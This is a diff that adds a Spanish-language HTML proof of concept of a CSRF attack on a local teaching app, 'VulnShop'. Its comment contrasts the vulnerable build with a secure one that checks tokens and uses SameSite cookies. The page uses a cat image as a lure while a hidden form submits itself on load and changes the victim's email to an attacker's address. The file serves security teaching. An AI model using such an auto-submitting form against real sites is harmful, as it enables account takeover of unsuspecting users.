@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="es">
+<head><meta charset="utf-8"><title>Pagina del atacante</title></head>
+<body>
+<!--
+  Prueba de concepto de CSRF.
+  1. Inicia sesion en la version VULNERABLE (http://localhost:18080) como Marcos.
+  2. Abri este archivo en el mismo navegador (doble clic).
+  3. El formulario se envia solo al cargar y le cambia el email a la victima,
+     sin que ella haga nada, porque la cookie de sesion viaja igual y el endpoint
+     no pide token anti-CSRF.
+  En la version SEGURA (18081) el mismo ataque falla: el POST sin _csrf valido
+  devuelve 403 y la cookie SameSite=strict no se envia desde otro origen.
+-->
+<h2>Mira este gatito &#128049;</h2>
+<p>(mientras tanto, en segundo plano, se intenta cambiar tu email en VulnShop)</p>
+
+<form id="evil" action="http://localhost:18080/profile/email" method="POST">
+  <input type="hidden" name="email" value="hackeado@atacante.com">
+</form>
+<script>document.getElementById('evil').submit();</script>
+</body>
+</html>
